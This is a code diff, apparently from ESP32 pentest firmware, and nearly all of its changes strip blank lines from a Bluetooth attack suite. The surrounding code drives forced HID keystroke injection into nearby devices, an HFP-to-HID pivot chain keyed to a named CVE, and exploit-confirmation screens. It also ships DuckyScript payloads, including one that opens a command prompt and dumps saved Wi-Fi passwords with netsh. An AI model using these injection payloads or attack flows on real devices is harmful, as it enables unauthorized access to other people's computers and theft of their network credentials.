@@ -4919,11 +4219,9 @@ void runAudioControlTest(NimBLEAddress target) {
             }
             tft.print(audioTestNames[i]);
         }
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Test  PREV/NEXT: Navigate  ESC: Back");
-
         bool inputProcessed = false;
         while(!inputProcessed) {
             if(check(EscPress)) {
@@ -4943,7 +4241,6 @@ void runAudioControlTest(NimBLEAddress target) {
             if(!inputProcessed) delay(50);
         }
     }
-
     cleanup.disable();
 }
 
@@ -4951,16 +4248,13 @@ void executeAudioTest(int testIndex, NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String connectionMethod = "";
     NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
     if(!pClient) {
         showAttackResult(false, "Failed to connect");
         return;
     }
-
     BLEStateManager::registerClient(pClient);
-
     AudioAttackService audioAttack;
     switch(testIndex) {
         case 0:
@@ -5009,10 +4303,8 @@ void runVulnerabilityScan(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     VulnerabilityScanner scanner;
     scanner.scanDevice(target);
-
     cleanup.disable();
 }
 
@@ -5020,11 +4312,9 @@ void runForceHIDInjection(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String name = "";
     int rssi = -60;
     bool hasHFP = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -5036,10 +4326,8 @@ void runForceHIDInjection(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     String script = getScriptFromUser();
     if(script.isEmpty()) return;
-
     if(hasHFP && !name.isEmpty()) {
         showAttackProgress("Device has HFP, attempting pivot...", TFT_CYAN);
         HFPExploitEngine hfp;
@@ -5047,9 +4335,7 @@ void runForceHIDInjection(NimBLEAddress target) {
             showAttackProgress("HFP successful! Forcing script injection...", TFT_GREEN);
             HIDDuckyService duckyService;
             bool result = duckyService.forceInjectDuckyScript(target, script, name, rssi);
-
             cleanup.disable();
-
             if(result) {
                 showAttackResult(true, "HFP → Forced injection successful!");
             } else {
@@ -5060,12 +4346,9 @@ void runForceHIDInjection(NimBLEAddress target) {
             showAttackProgress("HFP failed, trying regular forced injection...", TFT_ORANGE);
         }
     }
-
     HIDDuckyService duckyService;
     bool result = duckyService.forceInjectDuckyScript(target, script, name, rssi);
-
     cleanup.disable();
-
     if(result) {
         showAttackResult(true, "Forced HID injection successful!");
     } else {
@@ -5077,11 +4360,9 @@ void runHIDConnectionExploit(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     String name = "";
     int rssi = -60;
     bool hasHFP = false;
-
     if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
         for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
             if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
@@ -5093,18 +4374,15 @@ void runHIDConnectionExploit(NimBLEAddress target) {
         }
         xSemaphoreGive(scannerData.mutex);
     }
-
     if(hasHFP && !name.isEmpty()) {
         int choice = showAdaptiveMessage("Device has HFP", 
                                         "Test HFP vulnerability", 
                                         "Test HID connection", 
                                         "Cancel", 
                                         TFT_YELLOW, true, false);
-
         if(choice == 0) {
             HFPExploitEngine hfp;
             bool hfpVulnerable = hfp.testCVE202536911(target);
-
             if(hfpVulnerable) {
                 std::vector<String> lines;
                 lines.push_back("HFP VULNERABILITY TEST");
@@ -5120,12 +4398,9 @@ void runHIDConnectionExploit(NimBLEAddress target) {
         }
         if(choice == -1) return;
     }
-
     HIDExploitEngine hidExploit;
     HIDConnectionResult result = hidExploit.forceHIDConnection(target, name, rssi);
-
     cleanup.disable();
-
     if(result.success) {
         std::vector<String> lines;
         lines.push_back("HID CONNECTION EXPLOIT SUCCESS");
@@ -5146,7 +4421,6 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     const int MAX_SCRIPTS = 6;
     const char* scripts[] = {
         "Open Calculator",
@@ -5156,31 +4430,25 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
         "Custom Script",
         "Back"
     };
-
     int selected = 0;
     int scrollOffset = 0;
     bool exitMenu = false;
     int menuStartY = 60;
     int menuItemHeight = 30;
-
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if(maxVisibleItems > MAX_SCRIPTS) maxVisibleItems = MAX_SCRIPTS;
-
     while(!exitMenu) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("ADVANCED DUCKY") * 12) / 2, 15);
         tft.print("ADVANCED DUCKY");
         tft.setTextSize(1);
-
         for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < MAX_SCRIPTS; i++) {
             int scriptIdx = scrollOffset + i;
             int yPos = menuStartY + (i * menuItemHeight);
             if(yPos + menuItemHeight > tftHeight - 45) break;
-
             if(scriptIdx == selected) {
                 tft.fillRect(30, yPos, tftWidth - 60, menuItemHeight - 5, TFT_WHITE);
                 tft.setTextColor(TFT_BLACK, TFT_WHITE);
@@ -5192,12 +4460,10 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
                 tft.setCursor(35, yPos + 10);
                 tft.print("  ");
             }
-
             String displayName = scripts[scriptIdx];
             if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
             tft.print(displayName);
         }
-
         if(MAX_SCRIPTS > maxVisibleItems) {
             tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
             tft.setCursor(tftWidth - 25, menuStartY + 5);
@@ -5205,11 +4471,9 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
             tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 15);
             if(scrollOffset + maxVisibleItems < MAX_SCRIPTS) tft.print("v");
         }
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
-
         bool inputProcessed = false;
         while(!inputProcessed) {
             if(check(EscPress)) {
@@ -5240,7 +4504,6 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
                     exitMenu = true;
                 } else {
                     String script = "";
-
                     switch(selected) {
                         case 0: script = "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER"; break;
                         case 1: 
@@ -5254,13 +4517,10 @@ void runAdvancedDuckyInjection(NimBLEAddress target) {
                         case 3: script = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER"; break;
                         case 4: script = getScriptFromUser(); break;
                     }
-
                     if(!script.isEmpty()) {
                         HIDDuckyService duckyService;
                         bool result = duckyService.forceInjectDuckyScript(target, script, "", 0);
-
                         cleanup.disable();
-
                         if(result) {
                             showAttackResult(true, "Advanced injection successful!");
                         } else {
@@ -5279,12 +4539,9 @@ void runHIDVulnerabilityTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     HIDExploitEngine hidExploit;
     bool isVulnerable = hidExploit.testHIDVulnerability(target);
-
     cleanup.disable();
-
     if(isVulnerable) {
         std::vector<String> lines;
         lines.push_back("HID VULNERABILITY TEST");
@@ -5305,20 +4562,15 @@ void runHFPVulnerabilityTest(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Test HFP vulnerability (CVE-2025-36911)?")) return;
-
     HFPExploitEngine hfp;
     bool vulnerable = hfp.testCVE202536911(target);
-
     std::vector<String> lines;
     lines.push_back("HFP VULNERABILITY TEST");
     lines.push_back("Target: " + String(target.toString().c_str()));
     lines.push_back("CVE-2025-36911: " + String(vulnerable ? "POTENTIALLY VULNERABLE" : "LIKELY PATCHED"));
     lines.push_back("");
-
     cleanup.disable();
-
     if(vulnerable) {
         lines.push_back("Device has HFP service");
         lines.push_back("and allowed attribute access");
@@ -5339,12 +4591,9 @@ void runHFPAttackChain(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Execute full HFP attack chain?")) return;
-
     HFPExploitEngine hfp;
     hfp.executeHFPAttackChain(target);
-
     cleanup.disable();
 }
 
@@ -5352,29 +4601,21 @@ void runHFPHIDPivotAttack(NimBLEAddress target) {
     AutoCleanup cleanup([]() {
         BLEStateManager::deinitBLE(true);
     });
-
     if(!confirmAttack("Execute HFP → HID pivot attack?")) return;
-
     HFPExploitEngine hfp;
     showAttackProgress("Testing HFP vulnerability...", TFT_WHITE);
-
     if(hfp.testCVE202536911(target)) {
         showAttackProgress("Device vulnerable! Attempting HFP connection...", TFT_GREEN);
-
         if(hfp.establishHFPConnection(target)) {
             showAttackProgress("HFP connected! Pivoting to HID...", TFT_CYAN);
-
             HIDAttackServiceClass hidAttack;
             bool hidSuccess = hidAttack.injectKeystrokes(target);
-
             if(hidSuccess) {
                 showAttackProgress("HID access confirmed! Running DuckyScript...", TFT_BLUE);
                 HIDDuckyService ducky;
                 String defaultScript = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
                 bool scriptSuccess = ducky.injectDuckyScript(target, defaultScript);
-
                 cleanup.disable();
-
                 if(scriptSuccess) {
                     showAttackResult(true, "HFP → HID → DuckyScript chain successful!");
                 } else {
@@ -5405,23 +4646,19 @@ void runMultiTargetAttack() {
 void showAttackProgress(const char* message, uint16_t color) {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("BLE SUITE") * 12) / 2, 15);
     tft.print("BLE SUITE");
     tft.setTextSize(1);
-
     tft.setTextColor(color, bruceConfig.bgColor);
     tft.setCursor(20, 80);
     tft.print(message);
-
     static uint8_t spinnerPos = 0;
     const char* spinner = "|/-\\";
     tft.setCursor(tftWidth - 40, 80);
     tft.print(spinner[spinnerPos % 4]);
     spinnerPos++;
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, tftHeight - 30);
     tft.print("Please wait...");
@@ -5447,20 +4684,16 @@ void showAttackResult(bool success, const char* message) {
         tft.setTextSize(1);
         tft.setTextColor(TFT_WHITE, TFT_RED);
     }
-
     tft.setCursor(20, 80);
     if(message) tft.print(message);
     else tft.print(success ? "Attack successful!" : "Attack failed");
-
     tft.fillRoundRect(tftWidth/2 - 40, 150, 80, 35, 5, TFT_BLACK);
     tft.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
     tft.setCursor(tftWidth/2 - 15, 157);
     tft.print("OK");
-
     tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
     tft.setCursor(20, tftHeight - 30);
     tft.print("Press SEL to continue...");
-
     while(!check(SelPress)) delay(50);
     delay(200);
 }
@@ -5468,34 +4701,28 @@ void showAttackResult(bool success, const char* message) {
 bool confirmAttack(const char* targetName) {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("CONFIRM ATTACK") * 12) / 2, 15);
     tft.print("CONFIRM ATTACK");
     tft.setTextSize(1);
-
     tft.setCursor(20, 60);
     tft.print("Target: ");
     tft.println(targetName);
     tft.setCursor(20, 90);
     tft.println("FastPair buffer overflow exploit");
-
     tft.fillRect(20, 140, tftWidth - 40, 60, bruceConfig.bgColor);
     tft.fillRoundRect(50, 145, 80, 35, 5, TFT_GREEN);
     tft.setTextColor(TFT_BLACK, TFT_GREEN);
     tft.setCursor(70, 152);
     tft.print("OK");
-
     tft.fillRoundRect(150, 145, 80, 35, 5, TFT_RED);
     tft.setTextColor(TFT_WHITE, TFT_RED);
     tft.setCursor(170, 152);
     tft.print("NO");
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, tftHeight - 35);
     tft.print("SEL: Yes  NEXT: No  ESC: Cancel");
-
     while(true) {
         if(check(EscPress)) return false;
         if(check(SelPress)) return true;
@@ -5525,13 +4752,11 @@ NimBLEAddress parseAddress(const String& addressInfo) {
 bool requireSimpleConfirmation(const char* message) {
     tft.fillScreen(bruceConfig.bgColor);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("CONFIRM") * 12) / 2, 15);
     tft.print("CONFIRM");
     tft.setTextSize(1);
-
     tft.fillRect(20, 50, tftWidth - 40, 80, bruceConfig.bgColor);
     tft.setCursor(20, 60);
     String msgStr = message;
@@ -5541,11 +4766,9 @@ bool requireSimpleConfirmation(const char* message) {
         if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
         else tft.print(msgStr.substring(30));
     } else tft.print(message);
-
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, tftHeight - 35);
     tft.print("SEL: OK  ESC: Cancel");
-
     while(true) {
         if(check(EscPress)) {
             showAttackProgress("Cancelled", TFT_WHITE);
@@ -5562,17 +4785,14 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
     if(strlen(btn1) > 0) buttonCount++;
     if(strlen(btn2) > 0) buttonCount++;
     if(strlen(btn3) > 0) buttonCount++;
-
     if(buttonCount == 0 && autoProgress) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
         tft.print("MESSAGE");
         tft.setTextSize(1);
-
         tft.setTextColor(color, bruceConfig.bgColor);
         tft.setCursor(20, 80);
         String lineStr = line1;
@@ -5585,17 +4805,14 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
         delay(1500);
         return 0;
     }
-
     if(buttonCount == 0) {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
         tft.print("MESSAGE");
         tft.setTextSize(1);
-
         tft.setTextColor(color, bruceConfig.bgColor);
         tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
         tft.setCursor(20, 70);
@@ -5606,11 +4823,9 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
             if(lineStr.length() > 60) tft.print(lineStr.substring(30, 60) + "...");
             else tft.print(lineStr.substring(30));
         } else tft.print(line1);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("Press any key to continue...");
-
         while(true) {
             if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                 delay(200);
@@ -5622,16 +4837,13 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
         const char* buttons[] = {btn1, btn2, btn3};
         const char* actualBtn = "";
         for(int i = 0; i < 3; i++) if(strlen(buttons[i]) > 0) { actualBtn = buttons[i]; break; }
-
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
         tft.print("MESSAGE");
         tft.setTextSize(1);
-
         tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
         tft.setTextColor(color, bruceConfig.bgColor);
         tft.setCursor(20, 70);
@@ -5643,25 +4855,21 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
                 tft.print(lineStr.substring(30, 60) + "...");
             }
         } else tft.print(line1);
-
         String btnText = actualBtn;
         if(btnText.length() > 12) btnText = btnText.substring(0, 9) + "...";
         int btnWidth = btnText.length() * 12 + 20;
         if(btnWidth < 100) btnWidth = 100;
         int btnX = (tftWidth - btnWidth) / 2;
         int btnY = 150;
-
         tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
         tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
         int textWidth = btnText.length() * 6;
         int textX = btnX + (btnWidth - textWidth) / 2;
         tft.setCursor(textX, btnY + 12);
         tft.print(btnText);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  ESC: Cancel");
-
         while(true) {
             if(check(EscPress)) { delay(200); return -1; }
             if(check(SelPress)) { delay(200); return 0; }
@@ -5670,21 +4878,17 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
     } else {
         tft.fillScreen(bruceConfig.bgColor);
         tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setTextSize(2);
         tft.setCursor((tftWidth - strlen("SELECT") * 12) / 2, 15);
         tft.print("SELECT");
         tft.setTextSize(1);
-
         tft.setTextColor(color, bruceConfig.bgColor);
         tft.setCursor(20, 70);
         tft.print(line1);
-
         int btnWidth = 80;
         int btnHeight = 35;
         int btnY = 150;
-
         if(strlen(btn1) > 0) {
             tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
             tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
@@ -5693,7 +4897,6 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
             if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
             tft.print(btn1Str);
         }
-
         if(strlen(btn2) > 0) {
             tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
             tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
@@ -5702,12 +4905,10 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
             if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
             tft.print(btn2Str);
         }
-
         tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
         tft.setCursor(20, tftHeight - 35);
         if(strlen(btn3) > 0) tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
         else tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");
-
         while(true) {
             if(check(EscPress)) { delay(200); return -1; }
             if(check(SelPress)) { delay(200); return 0; }
@@ -5721,13 +4922,11 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
 void showWarningMessage(const char* message) {
     tft.fillScreen(TFT_YELLOW);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-
     tft.setTextColor(TFT_BLACK, TFT_YELLOW);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("WARNING") * 12) / 2, 15);
     tft.print("WARNING");
     tft.setTextSize(1);
-
     tft.setTextColor(TFT_BLACK, TFT_YELLOW);
     tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
     tft.setCursor(20, 70);
@@ -5738,11 +4937,9 @@ void showWarningMessage(const char* message) {
         if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
         else tft.print(msgStr.substring(30));
     } else tft.print(message);
-
     tft.setTextColor(TFT_BLACK, TFT_YELLOW);
     tft.setCursor(20, tftHeight - 35);
     tft.print("Press any key to continue...");
-
     while(true) {
         if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
             delay(200);
@@ -5755,13 +4952,11 @@ void showWarningMessage(const char* message) {
 void showErrorMessage(const char* message) {
     tft.fillScreen(TFT_RED);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-
     tft.setTextColor(TFT_WHITE, TFT_RED);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("ERROR") * 12) / 2, 15);
     tft.print("ERROR");
     tft.setTextSize(1);
-
     tft.setTextColor(TFT_WHITE, TFT_RED);
     tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
     tft.setCursor(20, 70);
@@ -5772,10 +4967,8 @@ void showErrorMessage(const char* message) {
         if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
         else tft.print(msgStr.substring(30));
     } else tft.print(message);
-
     tft.setCursor(20, tftHeight - 35);
     tft.print("Press any key to continue...");
-
     while(true) {
         if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
             delay(200);
@@ -5788,13 +4981,11 @@ void showErrorMessage(const char* message) {
 void showSuccessMessage(const char* message) {
     tft.fillScreen(TFT_GREEN);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-
     tft.setTextColor(TFT_WHITE, TFT_GREEN);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen("SUCCESS") * 12) / 2, 15);
     tft.print("SUCCESS");
     tft.setTextSize(1);
-
     tft.setTextColor(TFT_BLACK, TFT_GREEN);
     tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
     tft.setCursor(20, 70);
@@ -5805,10 +4996,8 @@ void showSuccessMessage(const char* message) {
         if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
         else tft.print(msgStr.substring(30));
     } else tft.print(message);
-
     tft.setCursor(20, tftHeight - 35);
     tft.print("Press any key to continue...");
-
     while(true) {
         if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
             delay(200);
@@ -5821,18 +5010,15 @@ void showSuccessMessage(const char* message) {
 void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor) {
     tft.fillScreen(bgColor);
     tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
     tft.setTextColor(TFT_WHITE, bgColor);
     tft.setTextSize(2);
     tft.setCursor((tftWidth - strlen(title) * 12) / 2, 15);
     tft.print(title);
     tft.setTextSize(1);
-
     tft.setTextColor(textColor, bgColor);
     int yPos = 60;
     int lineHeight = 20;
     int maxLines = 8;
-
     for(int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
         if(yPos + lineHeight > tftHeight - 45) break;
         tft.setCursor(20, yPos);
@@ -5841,11 +5027,9 @@ void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, u
         tft.print(displayLine);
         yPos += lineHeight;
     }
-
     tft.setTextColor(TFT_WHITE, bgColor);
     tft.setCursor(20, tftHeight - 35);
     tft.print("Press any key to continue...");
-
     while(true) {
         if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
             delay(200);
